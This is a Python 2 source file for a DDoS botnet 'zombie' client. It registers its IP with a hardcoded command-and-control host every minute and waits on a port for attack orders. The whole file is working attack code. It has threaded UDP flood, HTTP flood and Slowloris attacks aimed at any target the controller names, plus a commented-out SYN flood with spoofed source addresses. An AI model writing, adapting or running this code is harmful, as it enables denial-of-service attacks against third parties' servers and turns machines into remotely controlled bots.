import SocketServer
import socket
import threading
import time
import socket
import urllib2
import random
import os

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        attack, target, timeout, port, threads = self.data.split(" ")
        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
        self.request.sendall("ACK")
        if attack == "udp":
            fun = attackUDPFlood
        elif attack == "http":
            fun = attackHTTPFlood
        elif attack == "syn":
            fun = attackSYNFlood
        elif attack == "slowloris":
            fun = attackSlowLoris
        for i in xrange(int(threads)):
            attacker = fun(**kwargs)
            if attack == "slowloris": time.sleep(1)
            attacker.start()

class attackUDPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = int(kwargs['timeout'])
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.time()
        while time.time() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))

class attackHTTPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            try:
                res = urllib2.urlopen(self.target)
            except IOError:
                print "Could not open ", self.target

"""
class attackSYNFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            ip = IP()
            ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254))
            ip.dst = self.target

            tcp = TCP()
            tcp.sport = random.randint(1,65535)
            tcp.dport = self.port
            tcp.flags = 'S'

            send(ip/tcp, verbose = 0)
"""

class attackSlowLoris(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeoutAttack = kwargs['timeout']
        self.target = kwargs['target']

    def run(self):
        req = 'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n' % (self.target)
        start = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, 80))
            index = 0
            while time.time() - start < self.timeoutAttack and index < len(req):
                time.sleep(3)
                s.send(req[index])
                index += 1
        except Exception, e:
            print e

class registerIP(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.HOST, self.PORT))
            sock.sendall(socket.gethostbyname(socket.gethostname()))
            time.sleep(60)

class waitForInstructions(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        server = SocketServer.TCPServer((self.HOST, self.PORT), zombie)
        server.serve_forever()

if __name__ == '__main__':
    controlIP = "chunkeey.cs.washington.edu"
    controlIP = "69.91.176.40"
    zombieIP = socket.gethostbyname(socket.gethostname())
    controlPORT = 14000
    getInstrPORT = 15000

    instr = waitForInstructions(zombieIP, getInstrPORT)
    regis = registerIP(controlIP, controlPORT)

    instr.start()
    regis.start()
